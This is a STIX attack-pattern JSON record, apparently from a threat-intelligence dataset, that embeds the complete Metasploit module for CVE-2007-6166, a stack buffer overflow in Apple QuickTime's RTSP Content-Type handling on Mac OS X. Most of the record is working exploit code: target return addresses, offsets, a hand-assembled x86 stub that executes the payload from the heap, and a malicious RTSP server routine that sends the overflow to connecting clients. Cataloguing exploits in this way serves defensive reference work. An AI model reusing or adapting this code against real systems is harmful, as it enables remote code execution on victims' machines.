{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c94f889e-cdc1-4572-bd4b-3c3ee08545d4",
    "created": "2024-08-14T16:34:34.708832Z",
    "modified": "2024-08-14T16:34:34.708836Z",
    "name": "MacOS X QuickTime RTSP Content-Type Overflow",
    "description": " This module exploits a stack-based buffer overflow in Apple QuickTime before version 7.3.1. By sending an overly long RTSP response to a client, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/rtsp/quicktime_rtsp_content_type.rb",
            "external_id": "quicktime_rtsp_content_type.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6166"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'MacOS X QuickTime RTSP Content-Type Overflow',\n      'Description' => %q{\n        This module exploits a stack-based buffer overflow in Apple QuickTime\n        before version 7.3.1. By sending an overly long RTSP response to a\n        client, an attacker may be able to execute arbitrary code.\n      },\n      'Author' => 'unknown',\n      'Platform' => 'osx',\n      'References' =>\n        [\n          [ 'CVE', '2007-6166' ],\n          [ 'OSVDB', '40876'],\n          [ 'BID', '26549' ],\n        ],\n      'Payload' =>\n        {\n          'Space' => 3841,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'MaxNops' => 0,\n          'StackAdjustment' => -3500,\n        },\n      'Targets' =>\n        [\n          [ 'Mac OS X 10.4.0 PowerPC, QuickTime 7.0.0',\n            {\n              'Arch' => ARCH_PPC,\n              'Ret' => 0x8fe3f88c,\n              'RetOffset' => 551,\n              'PayloadOffset' => 879\n            }\n          ],\n\n          [ 'Mac OS X 10.5.0 PowerPC, QuickTime 7.2.1',\n            {\n              'Arch' => ARCH_PPC,\n              'Ret' => 0x8fe042e0,\n              'RetOffset' => 615,\n              'PayloadOffset' => 3351\n            }\n          ],\n\n          [ 'Mac OS X 10.4.8 x86, QuickTime 7.1.3',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 307,\n              'Writable' => 0xa0bd0f10,    # libSystem __IMPORT\n              # The rest of these are all in libSystem __TEXT\n              'ret' => 0x9015d336,\n              'poppopret' => 0x9015d334,\n              'setjmp' => 0x900bc438,\n              'strdup' => 0x90012f40,\n              'jmp_eax' => 0x9014a77f\n            }\n          ],\n\n          [ 'Mac OS X 10.5.0 x86, QuickTime 7.2.1',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 307,\n              'Writable' => 0x8fe66448,  # dyld __IMPORT\n              # The rest of these addresses are in dyld __TEXT\n              'ret' => 0x8fe1ceee,\n              'poppopret' => 0x8fe220d7,\n              'setjmp' => 0x8fe1ceb0,\n              'strdup' => 0x8fe1cd77,\n              'jmp_eax' => 0x8fe01041\n            }\n          ],\n\n        ],\n      'DefaultTarget'  => 2,\n      'DisclosureDate' => '2007-11-23'))\n  end\n\n  ######\n  # XXX: This does not work on Tiger apparently\n  def make_exec_payload_from_heap_stub()\n    frag0 =\n      \"\\x90\" + # nop\n      \"\\x58\" + # pop eax\n      \"\\x61\" + # popa\n      \"\\xc3\"   # ret\n\n    frag1 =\n      \"\\x90\" +             # nop\n      \"\\x58\" +             # pop eax\n      \"\\x89\\xe0\" +         # mov eax, esp\n      \"\\x83\\xc0\\x0c\" +     # add eax, byte +0xc\n      \"\\x89\\x44\\x24\\x08\" + # mov [esp+0x8], eax\n      \"\\xc3\"               # ret\n\n    setjmp = target['setjmp']\n    writable = target['Writable']\n    strdup = target['strdup']\n    jmp_eax = target['jmp_eax']\n\n    exec_payload_from_heap_stub =\n      frag0 +\n      [setjmp].pack('V') +\n      [writable + 32, writable].pack(\"V2\") +\n      frag1 +\n      \"X\" * 20 +\n      [setjmp].pack('V') +\n      [writable + 24, writable, strdup, jmp_eax].pack(\"V4\") +\n      \"X\" * 4\n  end\n\n  def on_client_connect(client)\n    print_status(\"Got client connection...\")\n\n    if (target['Arch'] == ARCH_PPC)\n      ret_offset = target['RetOffset']\n      payload_offset = target['PayloadOffset']\n\n      # Create pattern sized up to payload, since it always follows\n      # the return address.\n      boom = Rex::Text.pattern_create(payload_offset)\n\n      boom[ret_offset, 4] = [target['Ret']].pack('N')\n      boom[payload_offset, payload.encoded.length] = payload.encoded\n    else\n      boom = Rex::Text.pattern_create(327)\n\n      boom[307, 4] = [target['ret']].pack('V')\n      boom[311, 4] = [target['ret']].pack('V')\n      boom[315, 4] = [target['poppopret']].pack('V')\n      boom[319, 4] = [target['Writable']].pack('V')\n      boom[323, 4] = [target['Writable']].pack('V')\n\n      #\n      # Create exec-payload-from-heap-stub, but split it in two.\n      # The first word must be placed as the overwritten saved ebp\n      # in the attack string.  The rest is placed after the\n      # Writable memory addresses.\n      #\n      magic = make_exec_payload_from_heap_stub()\n      boom[303, 4] = magic[0, 4]\n      boom += magic[4..-1]\n\n      #\n      # Place the payload immediately after the stub as it expects\n      #\n      boom += payload.encoded\n    end\n\n    body = \" \"\n    header =\n      \"RTSP/1.0 200 OK\\r\\n\"+\n      \"CSeq: 1\\r\\n\"+\n      \"Content-Type: #{boom}\\r\\n\"+\n      \"Content-Length: #{body.length}\\r\\n\\r\\n\"\n\n    print_status(\"Sending RTSP response...\")\n    client.put(header + body)\n\n    print_status(\"Sleeping...\")\n    select(nil,nil,nil,1)\n\n    print_status(\"Starting handler...\")\n    handler(client)\n\n    print_status(\"Closing client...\")\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-11-23",
    "x_mitre_platforms": [
        "osx'"
    ]
}